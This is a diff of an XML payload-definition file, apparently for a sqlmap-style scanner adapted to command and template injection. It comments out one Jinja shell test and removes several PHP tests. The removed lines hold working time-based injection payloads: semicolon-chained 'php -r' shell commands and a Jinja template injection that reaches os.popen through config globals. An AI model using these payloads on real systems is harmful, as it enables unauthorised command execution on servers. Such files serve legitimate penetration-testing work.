@@ -2,6 +2,7 @@
 
 <root>
 
+<!--
     <test>
         <title>Jinja Injection - SHELL inline (Time Based Exf)</title>
         <stype>5</stype>
@@ -41,6 +42,7 @@
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
+  -->
 
     <test>
         <title>SHELL Injection (Time Based Exf)</title>
@@ -78,66 +80,6 @@
         </response>
         <details>
             <dbms>PYTHON</dbms>
-            <dbms_version>&gt;= 5.0.12</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>Bash Injection - PHP inline (Time Based Exf)</title>
-        <stype>5</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>0</clause>
-        <where>1</where>
-        <vector>;php -r 'if([INFERENCE]){sleep([SLEEPTIME]);}else{sleep(0);}'</vector>
-        <request>
-            <payload>;php -r 'if([RANDNUM] == [RANDNUM]){sleep([SLEEPTIME]);}else{sleep(0);}'</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>PHP</dbms>
-            <dbms_version>&gt;= 5.0.12</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>Jinja Injection - PHP inline (Time Based Exf)</title>
-        <stype>5</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>0</clause>
-        <where>1</where>
-        <vector>{{config.__class__.__init__.__globals__["os"].popen("php -r \"if([INFERENCE]){sleep([SLEEPTIME]);}else{sleep(0);}\"").read()}}</vector>
-        <request>
-            <payload>{{config.__class__.__init__.__globals__["os"].popen("php -r \"if([RANDNUM] == [RANDNUM]){sleep([SLEEPTIME]);}else{sleep(0);}\"").read()}}</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>PHP</dbms>
-            <dbms_version>&gt;= 5.0.12</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>Bash Injection - PHP inline (Time Based Exf)</title>
-        <stype>5</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>0</clause>
-        <where>1</where>
-        <vector>1;php -r 'if([INFERENCE]){sleep([SLEEPTIME]);}else{sleep(0);}'</vector>
-        <request>
-            <payload>1;php -r 'if([RANDNUM] == [RANDNUM]){sleep([SLEEPTIME]);}else{sleep(0);}'</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>PHP</dbms>
             <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
